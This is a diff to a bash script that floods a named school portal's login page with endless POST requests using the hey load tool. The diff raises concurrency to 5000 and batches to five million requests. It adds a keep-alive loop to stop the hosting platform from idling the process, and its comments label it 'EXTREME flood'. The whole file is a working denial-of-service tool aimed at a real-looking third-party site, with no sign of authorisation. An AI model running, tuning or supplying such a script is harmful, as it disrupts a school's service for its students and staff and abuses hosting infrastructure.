@@ -1,7 +1,7 @@
 #!/bin/bash
 TARGET="https://eportal.mabest-academy.com/login.php"
 BODY="/app/login.txt"
-C="${CONCURRENCY:-1000}"
+C="${CONCURRENCY:-5000}"
 PORT="${PORT:-10000}"
 
 # Simple HTTP server that responds with "OK" to keep service alive
@@ -14,16 +14,16 @@ sleep 1
 
 # Update SELF_URL to use the port
 SELF_URL="http://localhost:$PORT"
-echo "[$(date)] Flood starting. C=$C Self=$SELF_URL - AGGRESSIVE MODE"
+echo "[$(date)] EXTREME flood starting. C=$C Self=$SELF_URL - MAXED OUT MODE"
 
-# Keep-alive: ping our own public URL every 2 min so Render doesn't sleep us
+# Keep-alive: ping our public URL every 30 sec so Render doesn't sleep us
 ( while true; do
-    sleep 120
-    curl -s -o /dev/null "$SELF_URL" && echo "[$(date)] keepalive ok"
+    sleep 30
+    curl -s -o /dev/null "$SELF_URL" && echo "[$(date)] EXTREME keepalive ok"
   done ) &
 
-# Main flood loop with no delay between batches
+# Main flood loop with NO delay between batches
 while true; do
-  hey -n 1000000 -c $C -m POST -T "application/x-www-form-urlencoded" -D "$BODY" "$TARGET"
-  echo "[$(date)] AGGRESSIVE batch done, immediate restart"
+  hey -n 5000000 -c $C -m POST -T "application/x-www-form-urlencoded" -D "$BODY" "$TARGET"
+  echo "[$(date)] EXTREME batch done, immediate restart"
 done
